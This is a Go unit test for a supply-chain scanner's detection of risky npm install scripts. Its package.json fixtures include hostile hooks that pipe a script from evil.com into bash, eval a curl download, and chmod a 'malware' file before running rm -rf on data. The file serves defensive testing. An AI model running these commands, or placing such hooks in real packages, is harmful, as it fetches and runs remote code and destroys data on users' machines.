package scanner

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/Alivanroy/Typosentinel/internal/config"
	"github.com/Alivanroy/Typosentinel/pkg/types"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestInstallScriptDetection(t *testing.T) {
	tests := []struct {
		name             string
		packageJSON      string
		expectThreats    bool
		expectedSeverity types.Severity
		expectedPattern  string
	}{
		{
			name: "No install scripts",
			packageJSON: `{
				"name": "safe-package",
				"version": "1.0.0",
				"dependencies": {
					"express": "^4.0.0"
				}
			}`,
			expectThreats: false,
		},
		{
			name: "Benign install script",
			packageJSON: `{
				"name": "build-package",
				"version": "1.0.0",
				"scripts": {
					"install": "node-gyp rebuild"
				}
			}`,
			expectThreats:    true,
			expectedSeverity: types.SeverityMedium,
		},
		{
			name: "Suspicious curl download",
			packageJSON: `{
				"name": "suspicious-package",
				"version": "1.0.0",
				"scripts": {
					"postinstall": "curl https://evil.com/payload.sh | bash"
				}
			}`,
			expectThreats:    true,
			expectedSeverity: types.SeverityHigh,
			expectedPattern:  "curl",
		},
		{
			name: "Suspicious eval usage",
			packageJSON: `{
				"name": "eval-package",
				"version": "1.0.0",
				"scripts": {
					"preinstall": "eval $(curl -s https://install.sh)"
				}
			}`,
			expectThreats:    true,
			expectedSeverity: types.SeverityHigh,
			expectedPattern:  "eval",
		},
		{
			name: "Dangerous chmod and rm",
			packageJSON: `{
				"name": "dangerous-package",
				"version": "1.0.0",
				"scripts": {
					"install": "chmod +x ./malware && rm -rf /important/data"
				}
			}`,
			expectThreats:    true,
			expectedSeverity: types.SeverityHigh,
			expectedPattern:  "chmod",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create a temp directory
			tmpDir, err := os.MkdirTemp("", "install-script-test")
			require.NoError(t, err)
			defer os.RemoveAll(tmpDir)

			// Write the package.json
			packageJSONPath := filepath.Join(tmpDir, "package.json")
			err = os.WriteFile(packageJSONPath, []byte(tt.packageJSON), 0644)
			require.NoError(t, err)

			// Create analyzer
			cfg := &config.Config{
				Scanner: &config.ScannerConfig{
					IncludeDevDeps: false,
				},
			}
			analyzer := &NodeJSAnalyzer{config: cfg}

			// Parse the package.json
			packages, err := analyzer.parsePackageJSON(packageJSONPath)
			require.NoError(t, err)

			if tt.expectThreats {
				// Should have at least one package (from dependencies or the root)
				require.NotEmpty(t, packages)

				// Find threats
				var threats []types.Threat
				for _, pkg := range packages {
					threats = append(threats, pkg.Threats...)
				}

				assert.NotEmpty(t, threats, "Expected to find install script threats")

				if len(threats) > 0 {
					// Check severity
					if tt.expectedSeverity != 0 {
						found := false
						for _, threat := range threats {
							if threat.Type == types.ThreatTypeInstallScript && threat.Severity == tt.expectedSeverity {
								found = true
								break
							}
						}
						assert.True(t, found, "Expected to find threat with severity %s", tt.expectedSeverity)
					}

					// Check for expected pattern
					if tt.expectedPattern != "" {
						found := false
						for _, threat := range threats {
							if threat.Type == types.ThreatTypeInstallScript {
								for _, ev := range threat.Evidence {
									if val, ok := ev.Value.(string); ok {
										if contains(val, tt.expectedPattern) {
											found = true
											break
										}
									}
								}
							}
						}
						assert.True(t, found, "Expected to find pattern '%s' in evidence", tt.expectedPattern)
					}
				}
			} else {
				// Should not have install script threats
				for _, pkg := range packages {
					for _, threat := range pkg.Threats {
						assert.NotEqual(t, types.ThreatTypeInstallScript, threat.Type,
							"Should not have install script threats for safe packages")
					}
				}
			}
		})
	}
}

func contains(s, substr string) bool {
	return len(s) > 0 && len(substr) > 0 && (s == substr || len(s) >= len(substr) && func() bool {
		for i := 0; i <= len(s)-len(substr); i++ {
			if s[i:i+len(substr)] == substr {
				return true
			}
		}
		return false
	}())
}
